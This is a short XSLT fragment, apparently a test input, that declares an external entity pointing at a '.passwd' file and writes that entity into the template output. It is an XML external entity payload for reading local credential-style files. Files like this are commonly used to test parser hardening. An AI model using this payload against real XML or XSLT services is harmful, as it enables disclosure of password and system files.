<!DOCTYPE xsl:stylesheet [
    <!ENTITY passwd SYSTEM ".passwd" >]>

<xsl:template match="/">
    &passwd;
</xsl:template>
